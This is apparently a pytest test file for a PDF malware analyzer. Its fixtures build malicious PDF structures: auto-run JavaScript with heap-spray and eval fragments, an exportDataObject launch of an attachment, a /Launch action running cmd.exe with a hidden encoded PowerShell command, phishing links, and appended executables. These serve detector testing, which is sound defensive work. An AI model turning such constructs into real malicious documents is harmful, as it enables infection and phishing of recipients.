from __future__ import annotations

import io
import random
import time
import zlib

import pytest

from centinela.analyzers.pdf import PdfAnalyzer
from centinela.core.models import Artifact, FindingCategory, Severity
from tests.analyzers_docs._samples import build_pdf, build_pdf_objstm, fake_pe, pdf_stream, simple_pdf
from tests.helpers import make_artifact


@pytest.fixture
def analyzer(settings):
    return PdfAnalyzer(settings)


async def run(analyzer, make_ctx, data, filename="documento.pdf", detected_type="pdf"):
    art = make_artifact(data, filename, detected_type)
    findings = await analyzer.analyze(make_ctx(), art)
    rules = [f.rule for f in findings]
    assert len(rules) == len(set(rules))
    for f in findings:
        assert f.analyzer == "pdf" and f.rule.startswith("pdf.")
        assert f.title and f.description
        assert f.artifact_id == "att0"
    return {f.rule: f for f in findings}


def test_accepts(analyzer):
    assert analyzer.accepts(make_artifact(b"%PDF-1.7", "x.bin", "pdf"))
    assert analyzer.accepts(make_artifact(b"\x00\x00%PDF-1.4", "x.pdf", "unknown"))
    assert not analyzer.accepts(make_artifact(b"MZ\x90\x00", "factura.pdf", "pe"))
    assert not analyzer.accepts(make_artifact(b"PK\x03\x04", "x.zip", "zip"))


async def test_listing_only_entries_are_skipped(analyzer, make_ctx):
    listed = Artifact(id="att0/f.pdf", filename="f.pdf", detected_type="pdf", size=9000, depth=1, parent_id="att0",
                      listing_only=True)  # fmt: skip
    assert not analyzer.accepts(listed)
    assert await analyzer.analyze(make_ctx(), listed) == []
    weird = make_artifact(b"%PDF-1.7\n%inert\n", "f.pdf", "pdf").model_copy(update={"listing_only": True})
    assert not analyzer.accepts(weird)
    assert await analyzer.analyze(make_ctx(), weird) == []


# --------------------------------------------------------------------------- no-detección (falsos positivos)


async def test_benign_pdf_has_no_findings(analyzer, make_ctx):
    res = await run(analyzer, make_ctx, simple_pdf())
    assert res == {}


async def test_benign_pdf_with_goto_openaction_and_company_link(analyzer, make_ctx):
    # /OpenAction a una vista (muy común) + link a la web de la propia empresa con texto "ver documento"
    link = b"<< /Type /Annot /Subtype /Link /Rect [0 0 612 792] /A << /S /URI /URI (https://www.empresa.com/doc) >> >>"
    data = simple_pdf(
        "Haga clic aqui para ver documento",
        catalog_extra=b"/OpenAction [3 0 R /Fit] ",
        page_extra=b"/Annots [10 0 R] ",
        extra_objs={10: link},
    )
    res = await run(analyzer, make_ctx, data)
    assert res == {}


async def test_long_document_with_single_link_is_not_phishing(analyzer, make_ctx):
    text = " ".join(f"palabra{i}" for i in range(400))
    link = b"<< /Type /Annot /Subtype /Link /Rect [72 72 200 90] /A << /S /URI /URI (https://www.proveedor.com.ar) >> >>"
    data = simple_pdf(text, page_extra=b"/Annots [10 0 R] ", extra_objs={10: link})
    res = await run(analyzer, make_ctx, data)
    assert res == {}


async def test_embedded_invoice_xml_is_info_only(analyzer, make_ctx):
    xml = b'<?xml version="1.0"?><Factura><Total>100</Total></Factura>'
    data = simple_pdf(
        catalog_extra=b"/Names << /EmbeddedFiles << /Names [(factura.xml) 10 0 R] >> >> ",
        extra_objs={
            10: b"<< /Type /Filespec /F (factura.xml) /UF (factura.xml) /EF << /F 11 0 R >> >>",
            11: pdf_stream(xml, b"/Type /EmbeddedFile "),
        },
    )
    res = await run(analyzer, make_ctx, data)
    assert set(res) == {"pdf.embedded_file"}
    assert res["pdf.embedded_file"].severity == Severity.INFO


# --------------------------------------------------------------------------- JavaScript


async def test_openaction_javascript_is_high(analyzer, make_ctx):
    js = b"<< /Type /Action /S /JavaScript /JS (var s = unescape\\('%u0c0c%u0c0c'\\); eval\\(s\\);) >>"
    data = simple_pdf(catalog_extra=b"/OpenAction 10 0 R ", extra_objs={10: js})
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.javascript_autorun"]
    assert f.severity == Severity.HIGH and f.score >= 65
    assert f.evidence["ejecucion_automatica"] is True
    assert "unescape" in f.evidence["fragmentos"][0]["codigo"]
    assert f.evidence["funciones_de_exploit"]  # %u0c0c: heap spray


async def test_javascript_in_link_only_is_medium(analyzer, make_ctx):
    annot = b"<< /Type /Annot /Subtype /Link /Rect [72 72 200 90] /A << /S /JavaScript /JS (app.alert\\(1\\);) >> >>"
    text = " ".join(f"palabra{i}" for i in range(400))
    data = simple_pdf(text, page_extra=b"/Annots [10 0 R] ", extra_objs={10: annot})
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.javascript"]
    assert f.severity == Severity.MEDIUM and f.score == 35


async def test_javascript_hidden_in_compressed_object_stream(analyzer, make_ctx):
    # la acción vive dentro de un /ObjStm comprimido: un conteo sobre bytes crudos no la ve, pypdf sí
    inner = (
        b"<< /Type /Action /S /JavaScript /JS (this.exportDataObject\\({cName: 'a.exe', nLaunch: 2}\\);) >>"
    )
    data = build_pdf_objstm(
        {
            1: b"<< /Type /Catalog /Pages 2 0 R /OpenAction 10 0 R >>",
            2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
        },
        {10: inner},
    )
    assert b"/JavaScript" not in data
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.javascript_autorun"]
    assert f.score >= 75  # exportDataObject con nLaunch: suelta y ejecuta un adjunto
    assert f.evidence["suelta_o_abre_adjuntos"]


async def test_obfuscated_names(analyzer, make_ctx):
    js = b"<< /Type /Action /S /J#61vaScript /J#53 (app.alert\\(1\\)) >>"
    data = simple_pdf(catalog_extra=b"/OpenAct#69on 10 0 R ", extra_objs={10: js})
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.name_obfuscation"]
    assert "/JavaScript" in f.evidence["nombres_ofuscados"]
    assert "/OpenAction" in f.evidence["nombres_ofuscados"]
    assert any(r.startswith("pdf.javascript") for r in res)


async def test_xfa_script(analyzer, make_ctx):
    xdp = (
        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><subform><event activity="initialize">'
        b'<script contentType="application/x-javascript">app.launchURL("http://198.51.100.4/x");</script>'
        b"</event></subform></template></xdp:xdp>"
    )
    data = simple_pdf(
        catalog_extra=b"/AcroForm << /Fields [] /XFA 10 0 R >> ", extra_objs={10: pdf_stream(xdp)}
    )
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.javascript"]
    assert any("launchURL" in fr["codigo"] for fr in f.evidence["fragmentos"])


async def test_javascript_flate_bomb_is_bounded(analyzer, make_ctx):
    bomb = zlib.compress(b"/*" + b" " * 60_000_000 + b"*/ app.alert(1);", 9)
    data = simple_pdf(
        catalog_extra=b"/OpenAction 10 0 R ",
        extra_objs={10: b"<< /S /JavaScript /JS 11 0 R >>", 11: pdf_stream(bomb, b"/Filter /FlateDecode ")},
    )
    t0 = time.perf_counter()
    res = await run(analyzer, make_ctx, data)
    assert time.perf_counter() - t0 < 20
    assert "pdf.javascript_autorun" in res


# --------------------------------------------------------------------------- /Launch y adjuntos


async def test_launch_cmd_is_high(analyzer, make_ctx):
    launch = b"<< /S /Launch /Win << /F (cmd.exe) /P (/c powershell -w hidden -enc SQBFAFgA) >> >>"
    data = simple_pdf(catalog_extra=b"/OpenAction 10 0 R ", extra_objs={10: launch})
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.launch"]
    assert f.severity == Severity.HIGH and f.score == 85
    assert "cmd.exe" in f.evidence["destinos"][0]


async def test_launch_other_file_is_medium(analyzer, make_ctx):
    launch = b"<< /S /Launch /F (manual.txt) >>"
    annot = b"<< /Type /Annot /Subtype /Link /Rect [72 72 200 90] /A 10 0 R >>"
    data = simple_pdf(page_extra=b"/Annots [11 0 R] ", extra_objs={10: launch, 11: annot})
    res = await run(analyzer, make_ctx, data)
    assert res["pdf.launch"].severity == Severity.MEDIUM


async def test_embedded_executable(analyzer, make_ctx):
    data = simple_pdf(
        catalog_extra=b"/Names << /EmbeddedFiles << /Names [(factura.exe) 10 0 R] >> >> ",
        extra_objs={
            10: b"<< /Type /Filespec /F (factura.exe) /EF << /F 11 0 R >> >>",
            11: pdf_stream(zlib.compress(fake_pe()), b"/Type /EmbeddedFile /Filter /FlateDecode "),
        },
    )
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.embedded_executable"]
    assert f.severity == Severity.HIGH
    assert f.evidence["archivos"][0]["nombre"] == "factura.exe"
    assert f.evidence["archivos"][0]["tipo"] == "pe"


async def test_embedded_exe_disguised_with_innocent_name(analyzer, make_ctx):
    data = simple_pdf(
        catalog_extra=b"/Names << /EmbeddedFiles << /Names [(datos.txt) 10 0 R] >> >> ",
        extra_objs={
            10: b"<< /Type /Filespec /F (datos.txt) /EF << /F 11 0 R >> >>",
            11: pdf_stream(fake_pe(), b"/Type /EmbeddedFile "),
        },
    )
    res = await run(analyzer, make_ctx, data)
    assert "pdf.embedded_executable" in res


# --------------------------------------------------------------------------- phishing


async def test_link_only_phishing_pdf(analyzer, make_ctx):
    link = (
        b"<< /Type /Annot /Subtype /Link /Rect [100 300 500 500] /Border [0 0 0] "
        b"/A << /S /URI /URI (https://onedrive-docs.example.net/login?id=7) >> >>"
    )
    data = simple_pdf(
        "Tiene un documento compartido. Haga clic aqui para ver documento",
        page_extra=b"/Annots [10 0 R] ",
        extra_objs={10: link},
    )
    res = await run(analyzer, make_ctx, data)
    f = res["pdf.phishing_link"]
    assert f.category == FindingCategory.PHISHING
    assert f.severity == Severity.MEDIUM and f.score == 40
    assert f.evidence["urls"] == ["https://onedrive-docs.example.net/login?id=7"]


async def test_english_lure(analyzer, make_ctx):
    link = b"<< /Type /Annot /Subtype /Link /Rect [100 300 500 500] /A << /S /URI /URI (https://evil.example/a) >> >>"
    data = simple_pdf(
        "Secure document. Click here to view document", page_extra=b"/Annots [10 0 R] ", extra_objs={10: link}
    )
    res = await run(analyzer, make_ctx, data)
    assert "pdf.phishing_link" in res


async def test_image_only_pdf_with_big_link_is_low(analyzer, make_ctx):
    link = b"<< /Type /Annot /Subtype /Link /Rect [0 0 612 600] /A << /S /URI /URI (https://evil.example/a) >> >>"
    data = simple_pdf("", page_extra=b"/Annots [10 0 R] ", extra_objs={10: link})
    res = await run(analyzer, make_ctx, data)
    assert res["pdf.link_only"].severity == Severity.LOW


# --------------------------------------------------------------------------- cifrado


def _encrypted_pdf(user_password: str) -> bytes:
    from pypdf import PdfWriter

    w = PdfWriter()
    w.add_blank_page(200, 200)
    w.encrypt(user_password=user_password, owner_password="propietario-xyz", algorithm="RC4-128")
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


async def test_encrypted_with_empty_user_password_is_info(analyzer, make_ctx):
    res = await run(analyzer, make_ctx, _encrypted_pdf(""))
    assert set(res) == {"pdf.encrypted"}
    assert res["pdf.encrypted"].severity == Severity.INFO


async def test_password_protected_pdf_is_medium(analyzer, make_ctx):
    res = await run(analyzer, make_ctx, _encrypted_pdf("clave-1234"))
    f = res["pdf.encrypted_password"]
    assert f.severity == Severity.MEDIUM and f.score == 35
    assert f.category == FindingCategory.POLICY


# --------------------------------------------------------------------------- trucos y entradas hostiles


async def test_maldoc_in_pdf(analyzer, make_ctx):
    mht = (
        b'\nMIME-Version: 1.0\nContent-Type: multipart/related; boundary="x"\n\n--x\n'
        b"Content-Location: file:///C:/x/editdata.mso\nContent-Type: application/x-mso\n\n"
        b"QWN0aXZlTWltZQAAAAAAAA==\n--x--\n"
    )
    res = await run(analyzer, make_ctx, simple_pdf() + mht)
    assert res["pdf.maldoc_in_pdf"].severity == Severity.HIGH


async def test_appended_executable(analyzer, make_ctx):
    res = await run(analyzer, make_ctx, simple_pdf() + fake_pe())
    assert res["pdf.appended_payload"].evidence["tipo"] == "ejecutable de Windows"


async def test_malformed_pdf_falls_back_to_raw_keywords(analyzer, make_ctx):
    data = (
        b"%PDF-1.5\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >>\n"
        b"2 0 obj << /S /JavaScript /JS (eval\\(x\\)) >>\n" + b"\x00garbage\xff" * 50
    )
    res = await run(analyzer, make_ctx, data)
    assert "pdf.javascript_autorun" in res


async def test_garbage_after_header(analyzer, make_ctx):
    data = b"%PDF-1.4\n" + random.Random(3).randbytes(50_000)
    res = await run(analyzer, make_ctx, data)
    assert all(f.severity <= Severity.MEDIUM for f in res.values())


async def test_deeply_nested_arrays(analyzer, make_ctx):
    deep = b"[" * 5000 + b"]" * 5000
    data = simple_pdf(catalog_extra=b"/X 10 0 R ", extra_objs={10: deep})
    res = await run(analyzer, make_ctx, data)
    assert all(f.severity == Severity.INFO for f in res.values())


async def test_reference_cycles(analyzer, make_ctx):
    data = simple_pdf(
        catalog_extra=b"/A 10 0 R ",
        extra_objs={10: b"<< /Next 11 0 R /S /GoTo >>", 11: b"<< /Next 10 0 R /S /GoTo >>"},
    )
    res = await run(analyzer, make_ctx, data)
    assert res == {}


async def test_unc_gotor(analyzer, make_ctx):
    act = b"<< /S /GoToR /F (\\\\\\\\198.51.100.30\\\\share\\\\doc.pdf) /D [0 /Fit] >>"
    annot = b"<< /Type /Annot /Subtype /Link /Rect [72 72 200 90] /A 10 0 R >>"
    text = " ".join(f"palabra{i}" for i in range(400))
    data = simple_pdf(text, page_extra=b"/Annots [11 0 R] ", extra_objs={10: act, 11: annot})
    res = await run(analyzer, make_ctx, data)
    assert res["pdf.remote_goto"].severity == Severity.MEDIUM


def test_build_pdf_helper_is_valid():
    from pypdf import PdfReader

    r = PdfReader(io.BytesIO(simple_pdf("Hola")), strict=True)
    assert "Hola" in r.pages[0].extract_text()
    assert build_pdf({1: b"<< /Type /Catalog >>"}).startswith(b"%PDF-1.7")
